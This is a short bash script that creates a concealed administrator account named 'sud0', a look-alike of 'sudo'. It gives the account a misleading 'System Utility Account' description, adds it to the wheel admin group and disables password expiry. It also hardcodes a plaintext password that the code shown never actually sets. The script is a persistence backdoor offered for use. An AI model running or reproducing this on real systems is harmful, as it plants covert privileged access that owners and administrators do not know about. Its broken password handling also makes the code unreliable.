#!/bin/bash

### Hidden Backup Admin Account Script

USERNAME="sud0"
PASSWORD="Br3@k9las5!1@"

echo "WARNING: Static password is hardcoded in script."
echo ""

### Create user if missing
if ! id "$USERNAME" >/dev/null 2>&1; then
    useradd -m -s /bin/bash -c "System Utility Account" "$USERNAME"
    usermod -aG wheel "$USERNAME"
    chage -M -1 "$USERNAME"

    echo "Created backup admin account."
fi

